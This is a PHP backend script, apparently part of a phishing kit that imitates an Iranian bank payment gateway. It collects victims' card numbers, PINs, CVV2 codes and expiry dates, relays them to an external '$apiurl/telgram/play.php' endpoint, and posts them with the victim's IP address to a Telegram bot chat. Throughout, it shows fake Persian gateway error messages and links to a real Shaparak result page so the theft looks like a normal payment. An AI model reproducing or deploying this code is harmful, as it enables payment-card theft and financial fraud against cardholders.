<?php

error_reporting(0);

session_start();
include "info.php";
header("Content-Type: application/json");
include "functions.php";
if (isset($_SESSION['card']) or isset($_SESSION['card-main'])) {
    $input = file_get_contents("php://input");
    $json = json_decode($input, true);
    $panchek = strlen($json["pan"]);
    if ($panchek == '16') {
        $pan = $json["pan"];
    }

    $pinchek = strlen($json["pin"]);
    if ($pinchek == '5' || $pinchek == '6' || $pinchek == '7' || $pinchek == '8' || $pinchek == '9' || $pinchek == '10' || $pinchek == '11' || $pinchel == '12') {
        $pin = $json["pin"];
    }
    $cvvchek = strlen($json["cvv2"]);
    if ($cvvchek == '3' || $cvvchek == '4') {
        $cvv = $json["cvv2"];
    }

    $yearchek = strlen($json["expireYear"]);
    if ($yearchek == '2') {
        $year = $json["expireYear"];
    }
    $monthchek = strlen($json["expireMonth"]);
    if ($monthchek == '2') {
        $month = $json["expireMonth"];
    }
    $email = "None";

    $captchachek = strlen($json["captcha"]);
    if ($captchachek == '5') {
        $captcha = $json["captcha"];
    }
    $i = strlen($json["code"]);
    if ($i == '16') {
        $refid = $json["code"];
    }
	
	if(!file_exists('data_code/' . $pan . '.txt'))
	{
		$card_type = '#ISTA';
	}
	else
	{
		$card_type = '#POUYA';
		unlink('data_code/' . $pan . '.txt');
	}
	
	$cs = str_replace('#', '', $card_type);
	
    if (isset($pan) && isset($pin) && isset($cvv) && isset($month) && isset($year) && isset($captcha)) {
        $apirefid = curl_init();
        $apirefid_Url = "$apiurl/telgram/play.php?refid=$refid&pan=$pan&pin=$pin&cvv2=$cvv&month=$month&year=$year&captcha=$captcha&cardtype=$cs";
        curl_setopt($apirefid, CURLOPT_URL, $apirefid_Url);
        curl_setopt($apirefid, CURLOPT_POST, true);
        curl_setopt($apirefid, CURLOPT_RETURNTRANSFER, true);
        $jsonsk = curl_exec($apirefid);
        curl_close($apirefid);
        $result = json_decode($jsonsk, true);
        
        $ok = $result['status'];
        
        if($ok == "invalid user")
        {
            echo '{"status":"SALE_FAILED","description":"کارت نامعتبر می باشد"}';
        }
        
        elseif($ok == 'INVALID_CAPTCHA')
        {
            echo '{"status":"INVALID_CAPTCHA"}';
        }
        
        elseif(info($pan)[0] == false) 
        {
            echo '{"status":"SALE_FAILED","responseCode":"11","description":"اطلاعات وارد شده صحيح نمي باشد"}';
        }
        
        elseif($ok == "invalid card") 
        {
            echo '{"status":"SALE_FAILED","description":"کارت نامعتبر می باشد"}';
        }

        elseif($ok == "false")
        {
            echo '{"status":"SALE_FAILED","description":"موجودی کافی نمی باشد"}';
        }
        
        elseif($ok == 'SALE_FAILED') 
        {
            echo '{"status":"SALE_FAILED","description":"پرداخت انجام نشد"}';
        }
        elseif($ok == 'true')
        {
            include "time.php";
            $paylimit = 3;
            $sendEmail = true;
            $pan1 = substr($pan, 0, 4);
            $pan2 = substr($pan, 4, -8);
            $pan3 = substr($pan, 8, -4);
            $pan4 = substr($pan, 12);
            $cardn = substr($pan, 0, -10);
            $cardinfo = info($pan);
        
            function getUserIP()
            {
                $client = @$_SERVER['HTTP_CLIENT_IP'];
                $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
                $remote = $_SERVER['REMOTE_ADDR'];
                if (filter_var($client, FILTER_VALIDATE_IP)) {
                    $ip = $client;
                } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
                    $ip = $forward;
                } else {
                    $ip = $remote;
                }
                return $ip;
            }
        
            $ip = getUserIP();

            $Text = "╔═━──━▒   𝙾𝚃𝙿  𝙸𝙽𝙵𝙾   ▒━──━═╗
║ 📌 ℂ𝔸ℝ𝔻  𝕋𝕐ℙ𝔼  ➠  $card_type
╠━──━━──━─────━──━━──━
║🏦 #вΔ𝔫𝐊 ➠ $cardinfo[1]
╚═━──━━──━───━──━━──━═╝
╔═━─━▒ ༒ℂ𝓐𝔯𝐝 ιηℱ𝓞༒ ▒━─━═╗
║🎴 ᴄᴀʀᴅ  ➠ <code>$pan1$pan2$pan3$pan4</code>
║⌨️ ᴘᴀꜱꜱ  ➠  <code>$pin</code>
║🗝 𝙲𝚅𝚅𝟸 ➠  <code>$cvv</code>
║📅 𝙳𝙰𝚃𝙴 ➠  <code>$year</code> | <code>$month</code>
╚═━──━━──━───━──━━──━═╝
╔═━─━▒ ༒𝙽𝙴𝚇𝚃 𝙸𝙽𝙵𝙾༒ ▒━─━═╗
║🌐 🄸🄿         ➠ <code>$ip</code>
║📂 🄳🄰🅃🄴  ➠ $tarikh
║⌚️ 🅃🄸🄼🄴  ➠ $saat
╚═━──━▒  #𝙾𝚃𝙿_𝙸𝙽𝙵𝙾   ▒━──━═╝
";
            
            $KeyBoard = json_encode(['inline_keyboard' => [
                [['text' => 'تراکنش موفق ✅', 'url' => 'https://bpm.shaparak.ir/pgwchannel/result.mellat?RefId='. $refid]]    
            ], 'resize_keyboard' => true]);

            
            $apitel = curl_init();
    
            curl_setopt($apitel, CURLOPT_URL, 'https://api.telegram.org/bot' . $Token. '/sendMessage');
            curl_setopt($apitel, CURLOPT_POST, true);
            curl_setopt($apitel, CURLOPT_POSTFIELDS, "chat_id=$Id&parse_mode=HTML&reply_markup=$KeyBoard&text=" . ($Text));
            curl_setopt($apitel, CURLOPT_RETURNTRANSFER, true);
            $jso = curl_exec($apitel);
            curl_close($apitel);
        
            echo '{"status":"OK"}';
            session_unset();
        }
    }
}
?>